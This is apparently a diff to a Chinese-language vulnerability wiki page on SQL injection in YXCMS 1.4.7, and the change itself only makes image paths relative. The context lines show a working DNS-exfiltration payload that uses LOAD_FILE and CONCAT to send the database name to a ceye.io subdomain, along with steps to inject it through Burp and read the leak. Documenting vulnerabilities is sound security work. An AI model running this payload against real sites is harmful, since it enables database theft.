@@ -192,12 +192,12 @@ post包
 
     delid%5B%5D=select LOAD_FILE((CONCAT('\\\\',(SELECT DATABASE()),'.8571e594.2m1.pw\\abc')))&__hash__=529fbedab8a7b8a3f3f5a0f394f51cf2_08ebfXTKPoKd0tX4iq+aFMwhq5QkkRGC/NfUu/Ny83+UmU8u0MoCIj8
 
-![](/Users/aresx/Documents/VulWiki/.resource/YXCMS1.4.7SQL注入/media/rId27.png)
+![](./.resource/YXCMS1.4.7SQL注入/media/rId27.png)
 
 然后用burp截获数据，修改内容加上我们的payload，用原文的payload后面+会报错
 
-![](/Users/aresx/Documents/VulWiki/.resource/YXCMS1.4.7SQL注入/media/rId28.png)
+![](./.resource/YXCMS1.4.7SQL注入/media/rId28.png)
 
 然后进入<http://ceye.io/records/dns> 查看我们的数据
 
-![](/Users/aresx/Documents/VulWiki/.resource/YXCMS1.4.7SQL注入/media/rId30.shtml)
+![](./.resource/YXCMS1.4.7SQL注入/media/rId30.shtml)
